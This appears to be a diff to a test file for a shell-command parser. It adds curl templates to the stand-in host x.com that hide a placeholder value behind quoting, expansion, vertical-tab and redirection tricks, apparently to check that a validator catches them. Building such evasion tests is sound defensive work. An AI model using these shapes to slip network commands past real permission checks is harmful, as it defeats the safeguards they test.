@@ -254,6 +254,14 @@ _NEW_SHAPES: tuple[str, ...] = (
     "echo $\\\n'\\' ; curl {V} ; '\\'",
     "$'X=1' curl {V}",
     "curl x.com/@{V}",
+    # lenses: a query or fragment before `@`, a double-quoted `${` closed past its `"`, `$[…]`,
+    # a leading `\v`, a web tool's redirection target
+    "curl 'x.com?k=v@{V}'",
+    "curl x.com#@{V}",
+    'curl -d "${{X:-" {V} "}}" x.com',
+    "curl $[ 1 + {V} ]",
+    "\x0b {V} x.com",
+    "curl x.com > {V}",
 )
 _SEPARATED: tuple[str, ...] = (
     "{T}",
